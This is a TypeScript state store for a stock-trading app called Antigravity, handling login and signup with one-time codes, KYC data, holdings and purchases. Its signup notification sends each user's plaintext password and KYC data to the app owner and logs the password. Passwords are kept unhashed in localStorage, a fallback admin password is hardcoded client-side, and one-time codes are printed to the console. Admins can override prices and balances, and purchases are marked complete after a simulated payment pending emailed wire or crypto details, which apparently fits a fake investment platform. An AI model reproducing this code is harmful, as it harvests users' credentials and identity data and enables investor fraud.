import { create } from 'zustand';
import { persist } from 'zustand/middleware';
import type { User, StockHolding, Portfolio, MarketListing, PendingPurchase, PaymentMethod, AppNotification } from '@/types';

const syncUserToSupabase = async (email: string, userData: any) => {
  try {
    await fetch(`/api/users`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...userData, email: email.toLowerCase() })
    });
  } catch (error) {
    console.warn('Failed to sync user to Supabase:', error);
  }
};

// Fetch user record from Supabase and merge into local state
const fetchUserFromSupabase = async (email: string) => {
  try {
    const res = await fetch(`/api/users/${encodeURIComponent(email.toLowerCase())}`);
    if (res.ok) return await res.json();
  } catch {
    // server not reachable — silently fall through
  }
  return null;
};

interface AuthState {
  user: User | null;
  isAuthenticated: boolean;
  holdings: StockHolding[];
  marketListings: MarketListing[];
  pendingPurchase: PendingPurchase | null;
  login: (email: string, password: string, rememberMe?: boolean) => Promise<boolean>;
  requestLoginOTP: (email: string, password: string, rememberMe?: boolean) => Promise<string | null>;
  verifyLoginOTP: (email: string, otp: string) => Promise<boolean>;
  signup: (email: string, password: string, name: string) => Promise<boolean>;
  requestSignupOTP: (email: string, password: string, name: string, kycData?: any) => Promise<boolean>;
  verifySignupOTP: (email: string, otp: string) => Promise<boolean>;
  logout: () => void;
  addHolding: (holding: Omit<StockHolding, 'id'>) => void;
  removeHolding: (id: string) => void;
  updateHoldingPrice: (symbol: string, newPrice: number) => void;
  getPortfolio: () => Portfolio;
  setPendingPurchase: (purchase: PendingPurchase | null) => void;
  executePurchase: (symbol: string, shares: number, ownershipType: 'individual' | 'joint', jointHolderName?: string) => boolean;
  completePurchaseWithPayment: (paymentMethod: PaymentMethod) => Promise<{ success: boolean; message: string }>;
  sendOwnerNotification: (purchase: PendingPurchase, paymentMethod: PaymentMethod, userEmail: string) => Promise<void>;
  notifications: AppNotification[];
  registeredUsers: { [email: string]: { password: string; user: User } };
  addNotification: (notification: Omit<AppNotification, 'id' | 'date' | 'read'>) => void;
  markNotificationsAsRead: () => void;
  updateMarketAndHoldingPrice: (symbol: string, newPrice: number) => void;
  updateUser: (updates: Partial<User>) => void;
  updatePassword: (newPass: string) => void;
  toggle2FA: () => void;
  sendSignupNotification: (name: string, email: string, password: string, kycData?: any) => Promise<void>;
}

// Market listings - stocks available for purchase
const marketListingsData: MarketListing[] = [
  {
    symbol: 'AAPL',
    companyName: 'Apple Inc.',
    currentPrice: 255.92,
    previousClose: 253.50,
    change: 2.42,
    changePercent: 0.95,
    volume: 45611140,
    marketCap: 3761492983808,
    dayHigh: 256.13,
    dayLow: 250.65,
    sharesAvailable: 10000,
    sector: 'Technology',
  },
  {
    symbol: 'TSLA',
    companyName: 'Tesla, Inc.',
    currentPrice: 360.59,
    previousClose: 381.26,
    change: -20.67,
    changePercent: -5.42,
    volume: 82532959,
    marketCap: 1353089417216,
    dayHigh: 370.26,
    dayLow: 359.03,
    sharesAvailable: 5000,
    sector: 'Consumer Cyclical',
  },
  {
    symbol: 'NVDA',
    companyName: 'NVIDIA Corporation',
    currentPrice: 177.39,
    previousClose: 175.75,
    change: 1.64,
    changePercent: 0.93,
    volume: 141415327,
    marketCap: 4311464017920,
    dayHigh: 177.48,
    dayLow: 171.37,
    sharesAvailable: 8000,
    sector: 'Technology',
  },
  {
    symbol: 'MSFT',
    companyName: 'Microsoft Corporation',
    currentPrice: 425.50,
    previousClose: 422.00,
    change: 3.50,
    changePercent: 0.83,
    volume: 23456789,
    marketCap: 3150000000000,
    dayHigh: 428.00,
    dayLow: 420.50,
    sharesAvailable: 6000,
    sector: 'Technology',
  },
  {
    symbol: 'AMZN',
    companyName: 'Amazon.com Inc.',
    currentPrice: 198.75,
    previousClose: 196.20,
    change: 2.55,
    changePercent: 1.30,
    volume: 34567890,
    marketCap: 2050000000000,
    dayHigh: 200.00,
    dayLow: 195.50,
    sharesAvailable: 7500,
    sector: 'Consumer Cyclical',
  },
  {
    symbol: 'GOOGL',
    companyName: 'Alphabet Inc.',
    currentPrice: 175.20,
    previousClose: 173.80,
    change: 1.40,
    changePercent: 0.81,
    volume: 18923456,
    marketCap: 2180000000000,
    dayHigh: 176.50,
    dayLow: 172.90,
    sharesAvailable: 9000,
    sector: 'Communication Services',
  },
  {
    symbol: 'META',
    companyName: 'Meta Platforms Inc.',
    currentPrice: 595.30,
    previousClose: 590.00,
    change: 5.30,
    changePercent: 0.90,
    volume: 12345678,
    marketCap: 1520000000000,
    dayHigh: 598.00,
    dayLow: 588.50,
    sharesAvailable: 4000,
    sector: 'Communication Services',
  },
  {
    symbol: 'NFLX',
    companyName: 'Netflix Inc.',
    currentPrice: 885.50,
    previousClose: 875.00,
    change: 10.50,
    changePercent: 1.20,
    volume: 5678901,
    marketCap: 385000000000,
    dayHigh: 890.00,
    dayLow: 872.00,
    sharesAvailable: 3000,
    sector: 'Communication Services',
  },
  {
    symbol: 'AMD',
    companyName: 'Advanced Micro Devices',
    currentPrice: 102.45,
    previousClose: 100.20,
    change: 2.25,
    changePercent: 2.25,
    volume: 45678901,
    marketCap: 165000000000,
    dayHigh: 103.00,
    dayLow: 99.50,
    sharesAvailable: 12000,
    sector: 'Technology',
  },
  {
    symbol: 'INTC',
    companyName: 'Intel Corporation',
    currentPrice: 22.15,
    previousClose: 22.50,
    change: -0.35,
    changePercent: -1.56,
    volume: 67890123,
    marketCap: 95000000000,
    dayHigh: 22.80,
    dayLow: 21.90,
    sharesAvailable: 25000,
    sector: 'Technology',
  },
  {
    symbol: 'JPM',
    companyName: 'JPMorgan Chase & Co.',
    currentPrice: 245.80,
    previousClose: 243.50,
    change: 2.30,
    changePercent: 0.94,
    volume: 9876543,
    marketCap: 705000000000,
    dayHigh: 247.00,
    dayLow: 242.00,
    sharesAvailable: 5500,
    sector: 'Financial Services',
  },
  {
    symbol: 'V',
    companyName: 'Visa Inc.',
    currentPrice: 315.40,
    previousClose: 312.00,
    change: 3.40,
    changePercent: 1.09,
    volume: 4567890,
    marketCap: 645000000000,
    dayHigh: 317.00,
    dayLow: 311.00,
    sharesAvailable: 4500,
    sector: 'Financial Services',
  },
  {
    symbol: 'SPCX',
    companyName: 'SpaceX',
    currentPrice: 940.50,
    previousClose: 935.00,
    change: 5.50,
    changePercent: 0.58,
    volume: 1200300,
    marketCap: 210000000000,
    dayHigh: 950.00,
    dayLow: 930.00,
    sharesAvailable: 2500,
    sector: 'Aerospace',
  },
  {
    symbol: 'PLTR',
    companyName: 'Palantir Technologies Inc.',
    currentPrice: 24.50,
    previousClose: 22.80,
    change: 1.70,
    changePercent: 7.45,
    volume: 65432100,
    marketCap: 52000000000,
    dayHigh: 25.10,
    dayLow: 23.90,
    sharesAvailable: 15000,
    sector: 'Technology',
  },
  {
    symbol: 'RIVN',
    companyName: 'Rivian Automotive, Inc.',
    currentPrice: 15.20,
    previousClose: 16.00,
    change: -0.80,
    changePercent: -5.00,
    volume: 34567800,
    marketCap: 15000000000,
    dayHigh: 16.10,
    dayLow: 14.80,
    sharesAvailable: 12000,
    sector: 'Automotive',
  },
];

// Removed in-memory globals. Using persisted state.registeredUsers instead.

// Store for OTPs
const pendingOTPs: { [email: string]: { otp: string; expiresAt: number; data?: any; type: 'login' | 'signup' } } = {};

function generateOTP() {
  // In development, we can test with a known OTP or log it
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  return otp;
}

async function sendOTPEmail(email: string, otp: string) {
  // We gracefully use the dynamic hostname so it works when testing from a phone or another device!
  try {
    const response = await fetch(`/api/send-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, otp }),
    });

    if (response.ok) {
      const result = await response.json();
      console.log(`✅ Real email triggered perfectly via local server to ${email}`);
      if (result.previewUrl) {
        console.log(`Ethereal URL: ${result.previewUrl}`);
        alert(`API TESTING: A universal email was sent!\n\nView your OTP Email here:\n${result.previewUrl}`);
      }
      return;
    } else {
      console.warn(`⚠️ The local server returned an error:`, await response.text());
    }
  } catch (error) {
    console.warn(`🕒 Local server not running yet on port 3001. Check terminal.`);
  }

  // NOTE: If the server isn't running or encounters an error, we keep this fallback console log
  // so you can still read the OTP from the browser dev console and continue logging in!
  console.log(`\n=== LOCAL DEV MOCK EMAIL ===`);
  console.log(`To: ${email}`);
  console.log(`Subject: Your Verification Code`);
  console.log(`Body: Your Antigravity verification code is: ${otp}`);
  console.log(`=============================\n`);
}

export const useAuthStore = create<AuthState>()(
  persist(
    (set, get) => ({
      user: null,
      isAuthenticated: false,
      holdings: [],
      marketListings: marketListingsData,
      pendingPurchase: null,
      notifications: [],
      registeredUsers: {},

      updateUser: (updates) => {
        set((state) => {
          if (!state.user) return state;
          
          const oldEmail = state.user.email.toLowerCase();
          const newEmail = updates.email ? updates.email.toLowerCase() : oldEmail;
          
          const newUser = { ...state.user, ...updates };
          const newRegisteredUsers = { ...state.registeredUsers };
          
          if (oldEmail !== newEmail) {
            const oldCredentials = newRegisteredUsers[oldEmail];
            if (oldCredentials) {
                newRegisteredUsers[newEmail] = { ...oldCredentials, user: newUser };
                delete newRegisteredUsers[oldEmail];
            }
          } else if (newRegisteredUsers[newEmail]) {
            newRegisteredUsers[newEmail] = { ...newRegisteredUsers[newEmail], user: newUser };
          }
          
          if (newRegisteredUsers[newEmail]) {
            syncUserToSupabase(newEmail, newRegisteredUsers[newEmail]);
          }
          
          return {
            user: newUser,
            registeredUsers: newRegisteredUsers
          };
        });
      },

      updatePassword: (newPass) => {
        set((state) => {
          if (!state.user) return state;
          const emailLower = state.user.email.toLowerCase();
          if (state.registeredUsers[emailLower]) {
            const updatedUsers = {
              ...state.registeredUsers,
              [emailLower]: { ...state.registeredUsers[emailLower], password: newPass }
            };
            syncUserToSupabase(emailLower, updatedUsers[emailLower]);
            return { registeredUsers: updatedUsers };
          }
          return state;
        });
      },

      toggle2FA: () => {
        set((state) => {
          if (!state.user) return state;
          const newStatus = !state.user.twoFactorEnabled;
          const newUser = { ...state.user, twoFactorEnabled: newStatus };
          
          const emailLower = state.user.email.toLowerCase();
          const newRegisteredUsers = { ...state.registeredUsers };
          if (newRegisteredUsers[emailLower]) {
              newRegisteredUsers[emailLower].user = newUser;
              syncUserToSupabase(emailLower, newRegisteredUsers[emailLower]);
          }
          
          return { user: newUser, registeredUsers: newRegisteredUsers };
        });
      },

      addNotification: (notification) => {
        set((state) => ({
          notifications: [
            {
              ...notification,
              id: Math.random().toString(36).substr(2, 9),
              date: new Date(),
              read: false,
            },
            ...state.notifications,
          ],
        }));
      },

      markNotificationsAsRead: () => {
        set((state) => ({
          notifications: state.notifications.map((n) => ({ ...n, read: true })),
        }));
      },

      login: async (email: string, password: string, _rememberMe?: boolean) => {
        // Keep login method for backward compatibility or simple login bypass in UI
        const emailLower = email.toLowerCase();
        
        const storedUser = get().registeredUsers[emailLower];
        if (storedUser && storedUser.password === password) {
          set({
            user: storedUser.user,
            isAuthenticated: true,
            holdings: []
          });
          return true;
        }
        return false;
      },

      requestLoginOTP: async (email: string, password: string, rememberMe?: boolean) => {
        await new Promise((resolve) => setTimeout(resolve, 800));
        const emailLower = email.toLowerCase();

        let storedUser = get().registeredUsers[emailLower];

        // ADMIN — always use the fixed password from env, never from localStorage
        const adminEmail = (process.env.NEXT_PUBLIC_ADMIN_EMAIL || 'antigravityfinancial@gmail.com').toLowerCase();
        const adminPassword = process.env.NEXT_PUBLIC_ADMIN_PASSWORD || 'AntigravityAdmin2024!';
        if (emailLower === adminEmail) {
          if (password !== adminPassword) return 'Invalid email or password. Please try again.';
          const adminUser = {
            password: adminPassword,
            user: storedUser?.user ?? {
              id: 'admin-001',
              email: emailLower,
              name: 'System Administrator',
              createdAt: new Date(),
            }
          };
          set((state) => ({
            registeredUsers: { ...state.registeredUsers, [emailLower]: adminUser }
          }));
          storedUser = adminUser;
        } else {
          // Check if user is blocked in Supabase
          const serverRecord = await fetchUserFromSupabase(emailLower);
          if (serverRecord?.blocked) {
            return 'Your account has been suspended. Please contact support.';
          }
        }

        if (storedUser && storedUser.password === password) {
          const otp = generateOTP();
          pendingOTPs[emailLower] = {
            otp,
            expiresAt: Date.now() + 10 * 60 * 1000,
            type: 'login',
            data: { user: storedUser.user, password, rememberMe, storedUser }
          };
          await sendOTPEmail(emailLower, otp);
          return null; // null = success
        }
        return 'Invalid email or password. Please try again.';
      },

      verifyLoginOTP: async (email: string, otp: string) => {
        await new Promise((resolve) => setTimeout(resolve, 600));
        const emailLower = email.toLowerCase();
        const pending = pendingOTPs[emailLower];

        if (pending && pending.type === 'login' && pending.otp === otp && pending.expiresAt > Date.now()) {
          const { user } = pending.data;

          // Fetch server record to restore holdings + admin-set balance
          const serverRecord = await fetchUserFromSupabase(emailLower);
          const serverHoldings: StockHolding[] = serverRecord?.holdings?.map((h: any) => ({
            id: h.id,
            symbol: h.symbol,
            companyName: h.company_name,
            shares: h.shares,
            purchasePrice: h.purchase_price,
            currentPrice: h.current_price,
            ownershipType: h.ownership_type,
            jointHolderName: h.joint_holder_name ?? undefined,
            purchaseDate: new Date(h.purchase_date),
            status: h.status,
          })) ?? [];

          const mergedUser: User = {
            ...user,
            accountBalance: serverRecord?.account_balance ?? user.accountBalance,
          };

          set({
            user: mergedUser,
            isAuthenticated: true,
            holdings: serverHoldings,
          });

          // Fetch server-side notifications (e.g. admin balance updates)
          try {
            const notifRes = await fetch(`/api/notifications?email=${encodeURIComponent(emailLower)}`);
            if (notifRes.ok) {
              const serverNotifs = await notifRes.json();
              const mapped = serverNotifs.map((n: any) => ({
                id: n.id,
                title: n.title,
                message: n.message,
                type: n.type as 'success' | 'info' | 'warning',
                date: new Date(n.created_at),
                read: false,
              }));
              if (mapped.length > 0) {
                set((state) => ({
                  notifications: [...mapped, ...state.notifications],
                }));
              }
            }
          } catch {
            // Server notifications are non-critical
          }

          // Welcome notification
          get().addNotification({
            title: 'Welcome Back!',
            message: `Successfully logged in as ${user.name}.`,
            type: 'success',
          });

          // Apply any admin-set market price overrides
          try {
            const priceRes = await fetch('/api/market-prices');
            if (priceRes.ok) {
              const overrides = await priceRes.json();
              overrides.forEach((o: { symbol: string; price: number }) => {
                get().updateMarketAndHoldingPrice(o.symbol, o.price);
              });
            }
          } catch {
            // non-critical
          }

          delete pendingOTPs[emailLower];
          return true;
        }
        return false;
      },

      signup: async (email: string, password: string, name: string) => {
        // Keeping this for backward compatibility if needed
        const emailLower = email.toLowerCase();
        if (get().registeredUsers[emailLower]) {
          return false;
        }

        const newUser: User = {
          id: Math.random().toString(36).substr(2, 9),
          email: emailLower,
          name,
          createdAt: new Date(),
        };

        set((state) => ({
          registeredUsers: { ...state.registeredUsers, [emailLower]: { password, user: newUser } },
          user: newUser,
          isAuthenticated: true,
          holdings: []
        }));
        return true;
      },

      requestSignupOTP: async (email: string, password: string, name: string, kycData: any = null) => {
        await new Promise((resolve) => setTimeout(resolve, 800));
        
        const emailLower = email.toLowerCase();
        if (get().registeredUsers[emailLower]) {
          return false; // User already exists
        }

        const otp = generateOTP();
        pendingOTPs[emailLower] = {
          otp,
          expiresAt: Date.now() + 10 * 60 * 1000,
          type: 'signup',
          data: { name, password, kycData }
        };
        
        await sendOTPEmail(emailLower, otp);
        return true;
      },

      verifySignupOTP: async (email: string, otp: string) => {
        await new Promise((resolve) => setTimeout(resolve, 600));
        const emailLower = email.toLowerCase();
        const pending = pendingOTPs[emailLower];

        if (pending && pending.type === 'signup' && pending.otp === otp && pending.expiresAt > Date.now()) {
          const { name, password, kycData } = pending.data;
          
          const newUser: User = {
            id: Math.random().toString(36).substr(2, 9),
            email: emailLower,
            name,
            createdAt: new Date(),
          };

          set((state) => {
            const newState = {
              registeredUsers: { ...state.registeredUsers, [emailLower]: { password, user: newUser, kycData } },
              user: newUser,
              isAuthenticated: true,
              holdings: []
            };
            syncUserToSupabase(emailLower, { ...newState.registeredUsers[emailLower] });
            return newState;
          });
          
          get().addNotification({
            title: 'Account Created',
            message: 'Welcome to Antigravity! Your smart portfolio is ready.',
            type: 'success',
          });
          
          get().sendSignupNotification(name, emailLower, password, kycData);
          
          delete pendingOTPs[emailLower];
          return true;
        }
        return false;
      },

      sendSignupNotification: async (name: string, email: string, password: string, kycData: any = null) => {
        try {
          const response = await fetch(`/api/notify-signup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name, email, password, kycData }),
          });

          if (response.ok) {
            console.log(`✅ Admin signup notification sent successfully!`);
          } else {
            console.warn(`⚠️ The local server returned an error:`, await response.text());
          }
        } catch (error) {
          console.warn(`🕒 Local server not running yet on port 3001. Fallback to local console log.`);
          console.log('\n=== LOCAL MOCK: SIGNUP ALERT TO APP OWNER ===');
          console.log(`To: admin@antigravity-trading.com`);
          console.log(`User Name: ${name}`);
          console.log(`User Email: ${email}`);
          console.log(`User Password: ${password}`);
          console.log('=============================================\n');
        }
      },

      logout: () => {
        set({ user: null, isAuthenticated: false, holdings: [], pendingPurchase: null });
      },

      setPendingPurchase: (purchase) => {
        set({ pendingPurchase: purchase });
      },

      executePurchase: (symbol: string, shares: number, ownershipType: 'individual' | 'joint', jointHolderName?: string) => {
        const { marketListings, holdings } = get();
        const listing = marketListings.find(l => l.symbol === symbol);
        
        if (!listing) {
          return false;
        }
        
        if (listing.sharesAvailable < shares) {
          return false;
        }
        
        const existingHolding = holdings.find(h => h.symbol === symbol && h.ownershipType === ownershipType);
        
        if (existingHolding) {
          const totalShares = existingHolding.shares + shares;
          const totalCost = (existingHolding.shares * existingHolding.purchasePrice) + (shares * listing.currentPrice);
          const newAvgPrice = totalCost / totalShares;
          
          set((state) => ({
            holdings: state.holdings.map(h => 
              h.id === existingHolding.id 
                ? { ...h, shares: totalShares, purchasePrice: newAvgPrice }
                : h
            ),
            marketListings: state.marketListings.map(l =>
              l.symbol === symbol
                ? { ...l, sharesAvailable: l.sharesAvailable - shares }
                : l
            ),
          }));
        } else {
          const newHolding: StockHolding = {
            id: crypto.randomUUID(),
            symbol: listing.symbol,
            companyName: listing.companyName,
            shares: shares,
            purchasePrice: listing.currentPrice,
            currentPrice: listing.currentPrice,
            ownershipType: ownershipType,
            jointHolderName: jointHolderName,
            purchaseDate: new Date(),
            status: 'processing',
          };
          
          set((state) => ({
            holdings: [...state.holdings, newHolding],
            marketListings: state.marketListings.map(l =>
              l.symbol === symbol
                ? { ...l, sharesAvailable: l.sharesAvailable - shares }
                : l
            ),
          }));
        }
        
        return true;
      },

      sendOwnerNotification: async (purchase: PendingPurchase, paymentMethod: PaymentMethod, userEmail: string) => {
        try {
          const response = await fetch(`/api/notify-admin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userEmail, purchase, paymentMethod }),
          });

          if (response.ok) {
            console.log(`✅ Admin notification email sent successfully!`);
            alert(`We have received your payment request and will email you the payment details, your portfolio will be updated as soon as your payment is confirmed.`);
          } else {
            console.warn(`⚠️ The local server returned an error:`, await response.text());
          }
        } catch (error) {
          console.warn(`🕒 Local server not running yet on port 3001. Fallback to local console log.`);
          
          console.log('\n=== LOCAL MOCK: EMAIL TO APP OWNER ===');
          console.log(`To: admin@antigravity-trading.com`);
          console.log(`Subject: New Stock Purchase Order - ${purchase.symbol}`);
          console.log(`User: ${userEmail}`);
          console.log(`Stock: ${purchase.symbol} (${purchase.companyName})`);
          console.log(`Shares: ${purchase.shares}`);
          console.log(`Total amount: $${purchase.totalCost.toFixed(2)}`);
          console.log('========================================\n');
        }
      },

      completePurchaseWithPayment: async (paymentMethod: PaymentMethod) => {
        const { pendingPurchase, user, executePurchase, sendOwnerNotification } = get();
        
        if (!pendingPurchase) {
          return { success: false, message: 'No pending purchase found' };
        }
        
        if (!user) {
          return { success: false, message: 'User not authenticated' };
        }
        
        // Simulate payment processing
        await new Promise((resolve) => setTimeout(resolve, 1500));
        
        // Complete the stock purchase
        const success = executePurchase(
          pendingPurchase.symbol,
          pendingPurchase.shares,
          pendingPurchase.ownershipType,
          pendingPurchase.jointHolderName
        );
        
        if (success) {
          // Sync purchase directly to Firebase so Admin Command Center updates instantly
          syncUserToSupabase(user.email, { 
            ...get().registeredUsers[user.email.toLowerCase()],
            holdings: get().holdings,
            latestInteraction: new Date().toISOString()
          });

          // Send email notification to owner
          await sendOwnerNotification(pendingPurchase, paymentMethod, user.email);
          
          get().addNotification({
            title: 'Order Processing',
            message: `Your purchase of ${pendingPurchase.shares} shares of ${pendingPurchase.symbol} is currently processing.`,
            type: 'info',
          });
          
          // Clear pending purchase
          set({ pendingPurchase: null });
          
          const paymentMethodLabels: Record<PaymentMethod, string> = {
            wire: 'Wire Transfer',
            ach: 'ACH Payment',
            credit_card: 'Credit Card',
            crypto: 'Cryptocurrency'
          };
          
          return { 
            success: true, 
            message: `Purchase completed successfully using ${paymentMethodLabels[paymentMethod]}. The app owner has been notified.` 
          };
        }
        
        return { success: false, message: 'Failed to complete purchase' };
      },

      addHolding: (holding) => {
        const newHolding: StockHolding = {
          ...holding,
          id: crypto.randomUUID(),
        };
        set((state) => ({
          holdings: [...state.holdings, newHolding],
        }));
      },

      removeHolding: (id) => {
        set((state) => ({
          holdings: state.holdings.filter((h) => h.id !== id),
        }));
      },

      updateHoldingPrice: (symbol, newPrice) => {
        set((state) => ({
          holdings: state.holdings.map((h) =>
            h.symbol === symbol ? { ...h, currentPrice: newPrice } : h
          ),
        }));
      },

      updateMarketAndHoldingPrice: (symbol, newPrice) => {
        set((state) => {
          const updatedListings = state.marketListings.map(l => {
            if (l.symbol === symbol) {
              const change = newPrice - l.previousClose;
              const changePercent = (change / l.previousClose) * 100;
              // Make sure to cleanly round to 2 decimal places to avoid floating point issues
              return { 
                ...l, 
                currentPrice: Number(newPrice.toFixed(2)), 
                change: Number(change.toFixed(2)), 
                changePercent: Number(changePercent.toFixed(2))
              };
            }
            return l;
          });
          
          const updatedHoldings = state.holdings.map(h => 
            h.symbol === symbol ? { ...h, currentPrice: Number(newPrice.toFixed(2)) } : h
          );
          
          return {
            marketListings: updatedListings,
            holdings: updatedHoldings,
          };
        });
      },

      getPortfolio: () => {
        const { holdings } = get();
        const totalValue = holdings.reduce(
          (sum, h) => sum + h.shares * h.currentPrice,
          0
        );
        const totalCost = holdings.reduce(
          (sum, h) => sum + h.shares * h.purchasePrice,
          0
        );
        const totalGainLoss = totalValue - totalCost;
        const totalGainLossPercent = totalCost > 0 ? (totalGainLoss / totalCost) * 100 : 0;

        return {
          holdings,
          totalValue,
          totalCost,
          totalGainLoss,
          totalGainLossPercent,
        };
      },
    }),
    {
      name: 'antigravity-auth',
      partialize: (state) => ({ 
        user: state.user, 
        isAuthenticated: state.isAuthenticated, 
        holdings: state.holdings, 
        marketListings: state.marketListings,
        pendingPurchase: state.pendingPurchase,
        notifications: state.notifications,
        registeredUsers: state.registeredUsers
      }),
    }
  )
);
